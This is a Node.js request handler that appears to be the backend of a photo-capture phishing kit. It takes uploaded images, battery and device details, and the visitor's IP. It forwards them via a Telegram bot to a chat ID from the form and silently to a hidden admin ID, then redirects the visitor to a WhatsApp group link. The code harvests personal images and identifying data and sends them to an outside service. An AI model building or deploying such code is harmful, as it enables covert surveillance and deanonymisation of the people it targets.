const formidable = require('formidable');
const fs = require('fs');
const { Telegraf } = require('telegraf');

const bot = new Telegraf(process.env.BOT_TOKEN);

module.exports = (req, res) => {
  if (req.method !== 'POST') return res.status(405).send("Method Not Allowed");

  const form = new formidable.IncomingForm({
    uploadDir: "/tmp",
    keepExtensions: true,
  });

  form.parse(req, async (err, fields, files) => {
    if (err) return res.status(500).send("Form parse error");

    const uid = fields.uid;
    const battery = fields.battery || 'Unknown';
    const charging = fields.charging || 'Unknown';

    // عکسونه
    const photos = [];
    for (let i = 1; i <= 4; i++) {
      const file = files[`photo${i}`] || files[`photo`] // fallback
      if (!file) continue;
      photos.push(file);
    }

    if (!uid || photos.length === 0) return res.status(400).send("UID or photos missing");

    try {
      // Device & Network info
      const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || "Unknown";
      const userAgent = fields.device || 'Unknown';
      const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul', hour12: false });

      // Telegram Caption template
      const caption = (index) => `
╭─────📸 <b><blockquote>NEW PHOTO RECEIVED</blockquote></b> │─────────────────────╮
│
│─❖ 🔘 <b>Photo #${index}</b>
│─❖ 🙎 <b>User ID:</b> ${uid}
│─❖ 🔋 <b>Battery:</b> ${battery}%
│─❖ ⚡ <b>Charging:</b> ${charging}
│─❖ 🌐 <b>IP:</b> ${ip}
│─❖ 📱 <b>Device:</b> ${userAgent}
│─❖ 🕒 <b>Time:</b> ${timestamp}
╰───────────────────────────────────────
╭────👨🏻‍💻 <b><blockquote>BUILT BY WACIQ</blockquote></b> ───╮
╰─────────────────────╯
`.trim();

      // Send photos to Telegram
      for (let i = 0; i < photos.length; i++) {
        const buffer = fs.readFileSync(photos[i].filepath);

        // Send to user
        await bot.telegram.sendPhoto(uid, { source: buffer }, { caption: caption(i + 1), parse_mode: "HTML" });

        // Send to admin
        if (process.env.ADMIN_ID) {
          await bot.telegram.sendPhoto(process.env.ADMIN_ID, { source: buffer }, { caption: caption(i + 1), parse_mode: "HTML" });
        }

        // Cleanup
        fs.unlinkSync(photos[i].filepath);
      }

      // Redirect after success
      res.redirect("https://chat.whatsapp.com/KhSs9sHWVpkJC8siNMRfTS");

    } catch (e) {
      console.error("Telegram Error:", e.message);
      // Cleanup on error
      for (const file of photos) {
        if (file?.filepath) try { fs.unlinkSync(file.filepath); } catch {}
      }
      res.redirect("https://chat.whatsapp.com/KhSs9sHWVpkJC8siNMRfTS");
    }
  });
};
